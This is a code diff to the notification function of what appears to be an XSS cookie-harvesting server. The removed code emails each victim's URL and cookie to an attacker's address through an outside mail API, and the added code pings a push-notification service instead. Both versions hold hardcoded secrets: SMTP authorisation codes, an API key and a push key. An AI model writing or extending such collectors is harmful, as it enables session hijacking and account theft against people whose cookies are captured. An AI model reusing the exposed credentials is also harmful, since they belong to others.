@@ -60,29 +60,9 @@ async function insertToSupabaseAsync(url, cookie, screenshot, trigger_time) {
 
 // ===== 异步发送邮件函数 =====
 async function sendEmailNotification(url, cookie) {
-  const mailOptions = {
-    ColaKey: "b4S8aGLd0qkzJU1747541550124HWLfTnPixQ",
-    tomail: '1445600537@qq.com',
-    fromTitle: 'XSS Alert',
-    subject: '新 XSS 攻击触发通知',
-    smtpCode: "GZVNbreC39GVax3z",
-    smtpEmail: "chain00x@163.com",
-    smtpCodeType: '163',
-    isTextContent: false,
-    content: `
-      <h2>检测到新的 XSS 触发</h2>
-      <p><strong>URL:</strong> ${url}</p>
-      <p><strong>Cookie:</strong> ${cookie}</p>
-      <p><strong>时间:</strong> ${new Date().toLocaleString()}</p>
-    `,
-  };
 
-  const response = await fetch('http://luckycola.com.cn/tools/customMail', {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-    },
-    body: JSON.stringify(mailOptions),
+  const response = await fetch('https://sctapi.ftqq.com/SCT264973TwyxLsp1rLVuTjZ3jHX2DFGJi.send?title=xss', {
+    method: 'GET'
   });
 
   const result = await response.json();
